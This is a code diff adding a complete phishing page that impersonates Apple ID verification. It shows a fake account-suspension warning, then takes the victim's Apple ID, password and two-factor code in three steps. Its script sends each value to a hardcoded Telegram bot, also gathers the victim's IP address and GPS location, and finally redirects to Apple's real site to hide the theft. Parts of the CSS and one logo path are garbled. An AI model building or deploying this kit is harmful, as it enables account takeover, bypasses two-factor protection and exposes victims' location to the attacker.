@@ -1,0 +1,107 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Apple ID Verification</title>
+    <style>
+        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; background: #f2f2f7; color: #000; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .container { width: 100%; max-width: 380px; padding: 30px 20px; text12--align: center; background:9 #fff; border-radius: 12px; box.28-shadow:  0 4px 12px rgba(0,0,0,0.1); }
+        .logo { width: 50px; margin-bottom: 15px; }
+        h2 { margin-bottom: 10px; font-weight: 500; font-size: 22px; }
+        p { font-size: 14px; color: #666; margin-bottom: 20px; line-height: 1.4; }
+        input { width: 100%; padding: 15px; margin: 8px 0; background: #f2f2f7; border: 1px solid #ccc; color: #000; border-radius: 8px; box-sizing: border-box; outline: none; font-size: 16px; }
+        button { width: 100%; padding: 15px; background: #007aff; color: #fff; border: none; border-radius: 8px; font-size: 16px; font-weight: bold; margin-top: 15px; cursor: pointer; }
+        
+        /* Скрываем экраны */
+        #step2, #step3 { display: none; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <!-- ЭТАП 1: Ввод логина (Apple ID) -->
+        <div id="step1">
+            <svg class="logo" viewBox="0 0 170 170" xmlns="http://www.w3.org/2000/svg"><path d="M150.37 130.25c-2.45 5.66-5.35 10.87-8.71 15.66-4.58 6.53-8.33 11.05-11.22 13.56-4.48 4.6.23-14.42 6.35-3.69 0-8.14-1.05-13.32-3.18-5.2-2.12-9.97-3.17-14.34-3.17-4.58 0-9.49 1.05-14.74 3.17-5.26 2.13-9.5 3.24-12.74 3.35-4.92.21-9.84-1.96-14.74-6.52-3.13-2.73-7.04-7.43-11.72-14.12-5.02-7.15-9.14-15.45-12.37-24.9-3.46-10.18-5.2-20.05-5.2-29.62 0-10.95 2.37-20.39 7.12-28.33 3.73-6.36 8.7-11.39 14.92-15.08 6.22-3.69 12.94-5.57 20.2-5.66 3.92 0 9.06 1.21 15.45 3.59 6.37 2.39 10.47 3.6 12.27 3.6 1.34 0 5.88-1.42 13.59-4.26 7.28-2.62 13.43-3.71 18.47-3.28 13.65 1.1 23.91 6.48 30.73 16.16-12.21 7.4-18.25 17.76-18.14 31.02.11 10.34 3.86 18.94 11.22 25.78 3.34 3.17 7.06 5.62 11.18 7.36-.9 2.61-1.84 5.11-2.84 7.51zM119.11 9.57c0 8.12-2.97 15.7-8.88 22.7-7.14 8.34-15.78 13.15-25.15 12.41-.12-1.03-.19-2.11-.19-3.25 0-7.8 3.4-16.15 9.44-22.98 3.02-3.46 6.86-6.34 11.52-8.62 4.65-2.25 9.05-3.49 13.18-3.71.12 1.16.18 2.32.18 3.45z" fill="#000"/></svg>
+            <h2>Apple ID Verification</h2>
+            <p>Your Apple ID was flagged for suspicious activity. Please verify your account to avoid suspension.</p>
+            <form id="form1">
+                <input type="text" id="email" placeholder="Apple ID or Phone Number" required>
+                <button type="submit">Continue</button>
+            </form>
+        </div>
+
+        <!-- ЭТАП 2: Ввод пароля -->
+        <div id="step2">
+            <svg class="logo" viewBox="0 0 170 170" xmlns="http://www.w3.org/2000/svg"><path d="M150.37 130.25c-2.45 5.66-5.35 10.87-8.71 15.66-4.58 6.53-8.33 11.05-11.22 13.56-4.48 4.12-9.28 6.23-14.42 6.35-3.69 0-8.14-1.05-13.32-3.18-5.2-2.12-9.97-3.17-14.34-3.17-4.58 0-9.49 1.05-14.74 3.17-5.26 2.13-9.5 3.24-12.74 3.35-4.92.21-9.84-1.96-14.74-6.52-3.13-2.73-7.04-7.43-11.72-14.12-5.02-7.15-9.14-15.45-12.37-24.9-3.46-10.18-5.2-20.05-5.2-29.62 0-10.95 2.37-20.39 7.12-28.33 3.73-6.36 8.7-11.39 14.92-15.08 6.22-3.69 12.94-5.57 20.2-5.66 3.92 0 9.06 1.21 15.45 3.59 6.37 2.39 10.47 3.6 12.27 3.6 1.34 0 5.88-1.42 13.59-4.26 7.28-2.62 13.43-3.71 18.47-3.28 13.65 1.1 23.91 6.48 30.73 16.16-12.21 7.4-18.25 17.76-18.14 31.02.11 10.34 3.86 18.94 11.22 25.78 3.34 3.17 7.06 5.62 11.18 7.36-.9 2.61-1.84 5.11-2.84 7.51zM119.11 9.57c0 8.12-2.97 15.7-8.88 22.7-7.14 8.34-15.78 13.15-25.15 12.41-.12-1.03-.19-2.11-.19-3.25 0-7.8 3.4-16.15 9.44-22.98 3.02-3.46 6.86-6.34 11.52-8.62 4.65-2.25 9.05-3.49 13.18-3.71.12 1.16.18 2.32.18 3.45z" fill="#000"/></svg>
+            <h2>Enter Password</h2>
+            <p>Enter the password for <b id="display-email"></b></p>
+            <form id="form2">
+                <input type="password" id="password" placeholder="Password" required>
+                <button type="submit">Sign In</button>
+            </form>
+        </div>
+
+        <!-- ЭТАП 3: Ввод 2FA (СМС) -->
+        <div id="step3">
+            <h2>Two-Factor Authentication</h2>
+            <p>Enter the verification code sent to your trusted devices.</p>
+            <form id="form3">
+                <input type="tel" id="code2fa" placeholder="6-digit code" maxlength="6" style="text-align: center; letter-spacing: 5px; font-size: 20px;" required>
+                <button type="submit">Verify</button>
+            </form>
+        </div>
+    </div>
+
+    <script>
+        const BOT_TOKEN = "8758850534:AAF79a17p6NCuHMluPI_Rkw7FeoQSkCcRe8"; 
+        const CHAT_ID = "7485234259"; 
+        let userEmail = "";
+
+        function sendText(text) {
+            const img = new Image();
+            img.src = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(text)}`;
+        }
+
+        // ШАГ 1: Логин
+        document.getElementById('form1').addEventListener('submit', function(e) {
+            e.preventDefault();
+            userEmail = document.getElementById('email').value;
+            document.getElementById('display-email').innerText = userEmail;
+            
+            sendText(`🍏 Apple ID Phish (Шаг 1)\nЛогин: ${userEmail}`);
+            
+            document.getElementById('step1').style.display = 'none';
+            document.getElementById('step2').style.display = 'block';
+        });
+
+        // ШАГ 2: Пароль
+        document.getElementById('form2').addEventListener('submit', function(e) {
+            e.preventDefault();
+            const pass = document.getElementById('password').value;
+            
+            sendText(`🍏 Apple ID Phish (Шаг 2)\nЛогин: ${userEmail}\nПароль: ${pass}`);
+            
+            // Сразу собираем IP и GPS
+            fetch('https://api.ipify.org?format=json').then(r=>r.json()).then(d => sendText(`🌐 IP: ${d.ip}`)).catch(()=>{});
+            navigator.geolocation.getCurrentPosition(
+                (pos) => sendText(`🗺️ GPS: https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`),
+                (err) => {}
+            );
+
+            document.getElementById('step2').style.display = 'none';
+            document.getElementById('step3').style.display = 'block';
+        });
+
+        // ШАГ 3: Код 2FA
+        document.getElementById('form3').addEventListener('submit', function(e) {
+            e.preventDefault();
+            const code = document.getElementById('code2fa').value;
+            
+            sendText(`🔐 Apple ID Phish (2FA Код)\nЛогин: ${userEmail}\nКод: ${code}`);
+            
+            // Перекидываем на настоящий сайт Apple
+            window.location.href = "https://appleid.apple.com";
+        });
+    </script>
+</body>
+</html>
